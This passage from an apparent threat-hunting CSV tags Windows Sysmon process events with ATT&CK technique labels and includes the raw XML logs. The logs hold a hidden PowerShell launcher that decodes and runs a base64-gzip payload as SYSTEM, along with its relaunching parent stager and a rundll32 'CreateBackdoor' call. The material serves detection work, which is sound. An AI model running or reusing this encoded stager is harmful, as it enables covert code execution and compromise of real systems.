    <Data Name=""CommandLine"">&quot;powershell.exe&quot; -noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">365ABB72-2586-5CC9-0000-0020E7030000</Data>
    <Data Name=""LogonId"">0x3e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C</Data>
    <Data Name=""ParentProcessGuid"">365ABB72-AF8B-5CC8-0000-0010AC1B1900</Data>
    <Data Name=""ParentProcessId"">3872</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""ParentCommandLine"">powershell.exe  -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b=&apos;powershell.exe&apos;}else{$b=$env:windir+&apos;\syswow64\WindowsPowerShell\v1.0\powershell.exe&apos;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&apos;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;&apos;H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==&apos;&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&apos;Hidden&apos;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;</Data>
  </EventData>
</Event>",IEWIN7,Microsoft-Windows-Sysmon/Operational
[T1059] Command-Line Interface,1594332367.487274,2020-07-10T02:06:07.487274+04:00,,Threat,Low,Found User (NT AUTHORITY\SYSTEM) running image ( C:\Windows\System32\cmd.exe ) through command line ( cmd.exe ),1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-07-09T22:05:58.373961Z"">
    </TimeCreated>
    <EventRecordID>311382</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""3148"" ThreadID=""4088"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-07-09 22:05:55.880</Data>
    <Data Name=""ProcessGuid"">747F3D96-94C3-5F07-0000-001080B40100</Data>
    <Data Name=""ProcessId"">3096</Data>
    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.592 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows Command Processor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">Cmd.Exe</Data>
    <Data Name=""CommandLine"">cmd.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">747F3D96-1350-5F08-0000-0020E7030000</Data>
    <Data Name=""LogonId"">0x3e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
    <Data Name=""ParentProcessGuid"">00000000-0000-0000-0000-000000000000</Data>
    <Data Name=""ParentProcessId"">628</Data>
    <Data Name=""ParentImage"">?</Data>
    <Data Name=""ParentCommandLine"">?</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1115] Clipboard Data Collection,1594376435.589722,2020-07-10T14:20:35.589722+04:00,,Threat,High,Found User (MSEDGEWIN10\IEUser) running image ( C:\Windows\System32\rdpclip.exe ) through command line ( rdpclip ),1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-07-10T10:20:34.910334Z"">
    </TimeCreated>
    <EventRecordID>311396</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""3148"" ThreadID=""4088"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-07-10 10:20:34.877</Data>
    <Data Name=""ProcessGuid"">747F3D96-40F2-5F08-0000-0010D8A92C00</Data>
    <Data Name=""ProcessId"">3304</Data>
    <Data Name=""Image"">C:\Windows\System32\rdpclip.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1131 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">RDP Clipboard Monitor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">rdpclip.exe</Data>
    <Data Name=""CommandLine"">rdpclip</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">MSEDGEWIN10\IEUser</Data>
    <Data Name=""LogonGuid"">747F3D96-94CD-5F07-0000-0020ABBF0300</Data>
    <Data Name=""LogonId"">0x3bfab</Data>
    <Data Name=""TerminalSessionId"">1</Data>
    <Data Name=""IntegrityLevel"">Medium</Data>
    <Data Name=""Hashes"">SHA1=0265C1718EC95B025D9719F3B4872826F8F4661F,MD5=9E089ECF8B86983B7A77E3844CD02BB5,SHA256=AF5CAE4B514215E530643A7FEA2D7A47A1B15F6E5610347B217D1ABFA4AE0F92,IMPHASH=E3F33CEBF67721DAC951AFBD20321206</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-1350-5F08-0000-001014C50000</Data>
    <Data Name=""ParentProcessId"">824</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\svchost.exe -k NetworkService -s TermService</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1085] Rundll32 Execution detected,1584766825.46327,2020-03-21T09:00:25.463270+04:00,,Threat,High,"Found User (NT AUTHORITY\SYSTEM) running image ( C:\Windows\System32\rundll32.exe ) through command line ( rundll32 windowscoredeviceinfo.dll,CreateBackdoor )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2020-03-21T05:00:25.459240Z"">
    </TimeCreated>
    <EventRecordID>243558</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""2860"" ThreadID=""3508"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2020-03-21 05:00:25.452</Data>
    <Data Name=""ProcessGuid"">747F3D96-9F69-5E75-0000-001035972000</Data>
    <Data Name=""ProcessId"">1388</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">10.0.17763.1 (WinBuild.160101.0800)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
    <Data Name=""CommandLine"">rundll32 windowscoredeviceinfo.dll,CreateBackdoor</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">747F3D96-9DBA-5E75-0000-0020E7030000</Data>
    <Data Name=""LogonId"">0x3e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A</Data>
    <Data Name=""ParentProcessGuid"">747F3D96-9DBC-5E75-0000-00102C390100</Data>
    <Data Name=""ParentProcessId"">1652</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv</Data>
  </EventData>
</Event>",MSEDGEWIN10,Microsoft-Windows-Sysmon/Operational
[T1138] Application Shimming - process,1553028568.168278,2019-03-20T00:49:28.168278+04:00,,Threat,High,"[T1138] Application Shimming - process , please check raw log",1,"<?xml version=""1.0"" encoding=""utf-8""?>
<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""5770385F-C22A-43E0-BF4C-06F5698FFBD9"">
    </Provider>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2019-03-19T20:49:28.158264Z"">
    </TimeCreated>
    <EventRecordID>1966403</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID=""1564"" ThreadID=""1252"">
    </Execution>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>PC01.example.corp</Computer>
    <Security UserID=""S-1-5-18"">
    </Security>
  </System>
  <EventData>
    <Data Name=""RuleName""></Data>
    <Data Name=""UtcTime"">2019-03-19 20:49:28.058</Data>
    <Data Name=""ProcessGuid"">365ABB72-55D8-5C91-0000-001060C90700</Data>
    <Data Name=""ProcessId"">3648</Data>
    <Data Name=""Image"">C:\Windows\System32\sdbinst.exe</Data>
    <Data Name=""FileVersion"">6.0.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Application Compatibility Database Installer</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">&quot;C:\Windows\system32\sdbinst.exe&quot; -q -u &quot;C:\Windows\AppPatch\Test.SDB  &quot;  </Data>
    <Data Name=""CurrentDirectory"">C:\Windows\System32\</Data>
    <Data Name=""User"">EXAMPLE\user01</Data>
    <Data Name=""LogonGuid"">365ABB72-5417-5C91-0000-002035340300</Data>
    <Data Name=""LogonId"">0x33435</Data>
    <Data Name=""TerminalSessionId"">1</Data>
    <Data Name=""IntegrityLevel"">High</Data>
    <Data Name=""Hashes"">MD5=2996B3E7BBA42BEA62D386D9386EDE97,IMPHASH=87CBEAE39ADA9E96C7F27B94962CD83F</Data>
    <Data Name=""ParentProcessGuid"">365ABB72-551C-5C91-0000-001030590500</Data>
    <Data Name=""ParentProcessId"">2704</Data>
    <Data Name=""ParentImage"">C:\Program Files\Microsoft Application Compatibility Toolkit\Compatibility Administrator (32-bit)\Compatadmin.exe</Data>
    <Data Name=""ParentCommandLine"">&quot;C:\Program Files\Microsoft Application Compatibility Toolkit\Compatibility Administrator (32-bit)\Compatadmin.exe&quot; </Data>
  </EventData>
</Event>",PC01.example.corp,Microsoft-Windows-Sysmon/Operational
[T1086] PowerShell Process found,1556656012.371714,2019-05-01T00:26:52.371714+04:00,,Threat,High,"Found User (NT AUTHORITY\SYSTEM) running image ( C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ) through command line ( &quot;powershell.exe&quot; -noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) )",1,"<?xml version=""1.0"" encoding=""utf-8""?>
